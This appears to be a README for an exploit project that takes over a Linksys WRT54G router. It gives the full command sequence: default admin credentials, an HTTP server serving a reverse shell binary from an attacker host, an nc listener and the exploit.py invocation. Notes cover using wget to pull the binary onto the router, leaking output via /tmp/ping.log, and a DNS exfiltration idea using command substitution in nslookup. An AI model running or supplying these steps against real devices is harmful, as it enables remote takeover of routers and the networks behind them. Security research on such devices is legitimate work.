# Exploiting Linksys WRT54G

## Exploit
```bash
# Install the requirements.
pip install -r requirements.txt


ROUTER_HOST=192.169.1.1
ROUTER_USERNAME=admin
ROUTER_PASSWORD=admin

ATTACKER_HOST=192.169.1.100
ATTACKER_HTTP_SERVER_PORT=8000
ATTACKER_REVSHELL_HANDLER_PORT=4141


# Start HTTP server in order to serve the reverse shell executable.
cd revshell
python -m SimpleHTTPServer $ATTACKER_HTTP_SERVER_PORT

# Start reverse shell handler.
nc -l $ATTACKER_REVSHELL_HANDLER_PORT

# Run the exploit.
python exploit.py --host $ROUTER_HOST --username $ROUTER_USERNAME --password $ROUTER_PASSWORD --attacker-host $ATTACKER_HOST --attacker-http-port $ATTACKER_HTTP_SERVER_PORT --attacker-handler-port $ATTACKER_REVSHELL_HANDLER_PORT
```

### Leads for leaking command output
- [x] Look for file paths that are displayed within the web interface that command output can be written to.  
  Using `/tmp/ping.log` to view the output at `/Ping.asp`.
- [x] Use `wget` to download reverse shell binary to the router.
- [ ] Config the attacker as the DNS server and force the router to issue DNS requests with the command output.  
  Like ```nslookup `whoami`.fake.domain```


### TODOs
- [x] Use argparse and make the exploit an executable.


### Unsolved Mysteries
- If `ui_language` is stored in nvram (Non-Volatile Memory), how come it fixes itself upon reboot?


### Links
[Firmware](https://www.linksys.com/us/support-article?articleNum=148648)  
[Toolchain](https://www.linksys.com/us/support-article?articleNum=114663)
